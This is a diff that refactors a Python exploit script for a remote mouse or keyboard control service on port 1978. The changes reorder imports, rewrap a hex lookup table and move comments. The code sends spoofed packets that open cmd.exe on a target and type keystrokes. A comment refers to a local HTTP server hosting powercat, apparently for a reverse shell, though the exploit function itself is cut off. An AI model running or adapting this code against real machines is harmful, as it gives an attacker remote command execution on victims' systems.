@@ -1,9 +1,8 @@
 #!/usr/bin/env python3
 
-from socket import socket, AF_INET, SOCK_STREAM
-from time import sleep
 import sys
-import string
+from socket import AF_INET, SOCK_STREAM, socket
+from time import sleep
 
 target = socket(AF_INET, SOCK_STREAM)
 port = 1978
@@ -15,29 +14,31 @@ try:
 	http_port = "80" # Your local HTTP Server Port hosting powercat
 except:
 	print("USAGE: python " + sys.argv[0]+ " <target-ip>")
-	exit()
+	sys.exit()
 
 characters={
-	"A":"41","B":"42","C":"43","D":"44","E":"45","F":"46","G":"47","H":"48","I":"49","J":"4a","K":"4b","L":"4c","M":"4d","N":"4e",
-	"O":"4f","P":"50","Q":"51","R":"52","S":"53","T":"54","U":"55","V":"56","W":"57","X":"58","Y":"59","Z":"5a",
-	"a":"61","b":"62","c":"63","d":"64","e":"65","f":"66","g":"67","h":"68","i":"69","j":"6a","k":"6b","l":"6c","m":"6d","n":"6e",
-	"o":"6f","p":"70","q":"71","r":"72","s":"73","t":"74","u":"75","v":"76","w":"77","x":"78","y":"79","z":"7a",
-	"1":"31","2":"32","3":"33","4":"34","5":"35","6":"36","7":"37","8":"38","9":"39","0":"30",
-	" ":"20","+":"2b","=":"3d","/":"2f","_":"5f","<":"3c",
-	">":"3e","[":"5b","]":"5d","!":"21","@":"40","#":"23","$":"24","%":"25","^":"5e","&":"26","*":"2a",
-	"(":"28",")":"29","-":"2d","'":"27",'"':"22",":":"3a",";":"3b","?":"3f","`":"60","~":"7e",
-	"\\":"5c","|":"7c","{":"7b","}":"7d",",":"2c",".":"2e"}
+	"A":"41","B":"42","C":"43","D":"44","E":"45","F":"46","G":"47","H":"48","I":"49","J":"4a","K":"4b","L":"4c","M":"4d",
+	"N":"4e","O":"4f","P":"50","Q":"51","R":"52","S":"53","T":"54","U":"55","V":"56","W":"57","X":"58","Y":"59","Z":"5a",
+	"a":"61","b":"62","c":"63","d":"64","e":"65","f":"66","g":"67","h":"68","i":"69","j":"6a","k":"6b","l":"6c","m":"6d",
+	"n":"6e","o":"6f","p":"70","q":"71","r":"72","s":"73","t":"74","u":"75","v":"76","w":"77","x":"78","y":"79","z":"7a",
+	"1":"31","2":"32","3":"33","4":"34","5":"35","6":"36","7":"37","8":"38","9":"39","0":"30"," ":"20","+":"2b","=":"3d",
+	"/":"2f","_":"5f","<":"3c",">":"3e","[":"5b","]":"5d","!":"21","@":"40","#":"23","$":"24","%":"25","^":"5e","&":"26",
+	"*":"2a","(":"28",")":"29","-":"2d","'":"27",'"':"22",":":"3a",";":"3b","?":"3f","`":"60","~":"7e","\\":"5c","|":"7c",
+	"{":"7b","}":"7d",",":"2c",".":"2e"}
 
 def openCMD():
-	target.sendto(bytes.fromhex("6f70656e66696c65202f432f57696e646f77732f53797374656d33322f636d642e6578650a"), (rhost,port)) # openfile /C/Windows/System32/cmd.exe
+	 # openfile /C/Windows/System32/cmd.exe
+	target.sendto(bytes.fromhex("6f70656e66696c65202f432f57696e646f77732f53797374656d33322f636d642e6578650a"), (rhost,port))
 
 def SendString(string):
 	for char in string:
-		target.sendto(bytes.fromhex("7574663820" + characters[char] + "0a"),(rhost,port)) # Sends Character hex with packet padding
+		# Sends Character hex with packet padding
+		target.sendto(bytes.fromhex("7574663820" + characters[char] + "0a"),(rhost,port)) 
 		sleep(0.03)
 
 def SendReturn():
-	target.sendto(bytes.fromhex("6b657920203352544e"),(rhost,port)) # 'key 3RTN' - Similar to 'Remote Mouse' mobile app
+	# 'key 3RTN' - Similar to 'Remote Mouse' mobile app
+	target.sendto(bytes.fromhex("6b657920203352544e"),(rhost,port)) 
 	sleep(0.5)
 
 def exploit():
